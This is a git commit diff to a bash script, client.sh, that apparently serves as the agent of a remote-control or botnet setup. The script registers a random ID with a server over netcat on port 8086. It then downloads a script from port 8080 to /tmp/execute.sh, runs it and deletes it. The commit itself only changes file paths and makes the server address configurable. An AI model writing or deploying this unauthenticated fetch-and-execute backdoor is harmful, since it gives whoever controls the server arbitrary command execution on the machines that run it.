3050fadcb6f95cf58de4865e14ffd862201ea6a9
P4tches <P4tches@users.noreply.github.com>
2016-12-17 19:38:33 -0800

    Changed directories

--- client.sh
+++ client.sh
@@ -1,9 +1,12 @@
 #! /bin/bash
-if [ ! -f set.txt ]; then
-	env LC_CTYPE=C tr -dc "a-zA-Z0-9-_\$\?" < /dev/urandom | head -c 10 > set.txt
+#echo "$(dirname "$0")/set.txt"
+if [ ! -f $(dirname "$0")/set.txt ]; then
+        env LC_CTYPE=C tr -dc "a-zA-Z0-9-_\$\?" < /dev/urandom | head -c 10 > $(dirname "$0")/set.txt
+        echo >> $(dirname "$0")/set.txt
+        echo 127.0.0.1 >> $(dirname "$0")/set.txt
 fi
-echo $(cat set.txt) | nc 127.0.0.1 8086
-nc 127.0.0.1 8080 > /tmp/execute.sh
+echo $(sed '1q;d' $(dirname "$0")/set.txt) | nc $(head -n 2 $(dirname "$0")/set.txt | tail -1) 8086
+nc $(head -n 2 $(dirname "$0")/set.txt | tail -1) 8080 > /tmp/execute.sh
 chmod +x /tmp/execute.sh
 bash /tmp/execute.sh
 rm /tmp/execute.sh
